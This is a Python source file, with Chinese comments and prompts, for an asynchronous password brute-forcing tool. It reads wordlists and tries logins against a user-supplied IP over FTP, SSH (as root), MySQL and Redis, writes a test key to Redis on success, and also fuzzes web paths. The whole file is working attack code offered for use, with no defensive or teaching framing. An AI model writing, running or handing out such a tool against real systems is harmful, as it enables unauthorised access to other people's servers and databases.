import asyncio
import aiohttp
from ftplib import FTP
import paramiko
import pymysql
import redis
async def async_ftp(ip):
    found = False  # 用于标记是否找到正确密码
    async def ftp_single_try(line):
        nonlocal found  # 使用外部函数的 found 变量
        if found:  # 如果已经找到正确密码，直接返回
            return
        try:
            loop = asyncio.get_running_loop()
            result = await loop.run_in_executor(
                None, lambda: _ftp_try(line, ip)
            )
            if result:
                found = True  # 找到正确密码，设置标志
            return result
        except Exception as e:
            print(f"线程执行ftp出错: {e}")

    passwords = []
    with open("ftpfuzz", mode="r") as f:
        for line in f:
            line = line.strip()
            passwords.append(line)

    tasks = []
    for line in passwords:
        if found:  # 在提交任务前检查是否已找到正确密码
            break
        task = ftp_single_try(line)
        tasks.append(task)

    for task in asyncio.as_completed(tasks):
        try:
            await task
        except Exception as e:
            print(f"处理ftp任务出错: {e}")
def _ftp_try(line, ip):
    ftp = FTP()
    ftp.connect(ip, 21)
    try:
        ftp.login("woshidaheike", line)
        print(line + "密码正确"+"\n")
        ftp.close()
        return True
    except Exception as e:
        print(line + "密码不正确"+"\n")
        return False
async def async_ssh(ip):
    found = False
    async def ssh_single_try(line):
        nonlocal found
        if found:
            return
        try:
            loop = asyncio.get_running_loop()
            result = await loop.run_in_executor(
                None, lambda: _ssh_try(line, ip)
            )
            if result:
                found = True
            return result
        except Exception as e:
            print(f"线程执行ssh出错: {e}")
    passwords = []
    with open("sshfuzz", mode="r") as f:
        for line in f:
            line = line.strip()
            passwords.append(line)
    tasks = []
    for line in passwords:
        if found:
            break
        task = ssh_single_try(line)
        tasks.append(task)
    for task in asyncio.as_completed(tasks):
        try:
            await task
        except Exception as e:
            print(f"处理ssh任务出错: {e}")
def _ssh_try(line, ip):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, 22, username="root", password=line)
        print(line + "密码正确"+"\n")
        ssh.close()
        return True
    except paramiko.ssh_exception.AuthenticationException:
        print(line + "密码不正确"+"\n")
        return False
async def async_mysql(ip):
    found = False
    async def mysql_single_try(line):
        nonlocal found
        if found:
            return
        try:
            loop = asyncio.get_running_loop()
            result = await loop.run_in_executor(
                None, lambda: _mysql_try(line, ip)
            )
            if result:
                found = True
            return result
        except Exception as e:
            print(f"线程执行mysql出错: {e}")

    passwords = []
    with open("mysqlfuzz", mode="r") as f:
        for line in f:
            line = line.strip()
            passwords.append(line)
    tasks = []
    for line in passwords:
        if found:
            break
        task = mysql_single_try(line)
        tasks.append(task)
    for task in asyncio.as_completed(tasks):
        try:
            await task
        except Exception as e:
            print(f"处理mysql任务出错: {e}")
def _mysql_try(line, ip):
    try:
        conn = pymysql.connect(host=ip, port=3306, user="我是真的帅", password=line, charset='utf8')
        print(line + "密码正确"+"\n")
        conn.close()
        return True
    except Exception as e:
        print(line + "密码不正确"+"\n")
        return False
async def async_fredis(ip):
    found = False
    async def fredis_single_try(line):
        nonlocal found
        if found:
            return
        try:
            loop = asyncio.get_running_loop()
            result = await loop.run_in_executor(
                None, lambda: _fredis_try(line, ip)
            )
            if result:
                found = True
            return result
        except Exception as e:
            print(f"线程执行fredis出错: {e}")
    passwords = []
    with open("redisfuzz", mode="r") as f:
        for line in f:
            line = line.strip()
            passwords.append(line)
    tasks = []
    for line in passwords:
        if found:
            break
        task = fredis_single_try(line)
        tasks.append(task)
    for task in asyncio.as_completed(tasks):
        try:
            await task
        except Exception as e:
            print(f"处理fredis任务出错: {e}")
def _fredis_try(line, ip):
    try:
        r = redis.Redis(host=ip, port=6379, password=line, db=0)
        if r.ping():
            print(line + "密码正确"+"\n")
            r.set("test", "test")
            return True
        else:
            print(line + "无法连接到Redis"+"\n")
            return False
    except Exception as e:
        print(line + "密码不正确"+"\n")
        return False
async def async_path(ip):
    async with aiohttp.ClientSession() as session:
        with open("pathfuzz", mode="r") as f:
            tasks = []
            for line in f:
                line = line.strip()
                url = f"http://{ip}{line}"
                task = asyncio.create_task(fetch(session, url))
                tasks.append(task)
            results = await asyncio.gather(*tasks)
            for result in results:
                print(result)
async def fetch(session, url):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0'}
    async with session.get(url, headers=headers) as response:
        status = response.status
        return f"{url} {status}"
if __name__ == '__main__':
    fuc_list = {
        "1": async_ftp,
        "2": async_ssh,
        "3": async_mysql,
        "4": async_fredis,
        "5": async_path
    }
    num = 1
    ip = input("请输入IP:")
    for fuc in fuc_list.values():
        print(str(num) + "." + fuc.__name__)
        num += 1
    in_put = input("请选择你要爆破的协议：")
    if in_put in fuc_list:
        run = fuc_list[in_put]
        asyncio.run(run(ip))
    else:
        print("协议不存在")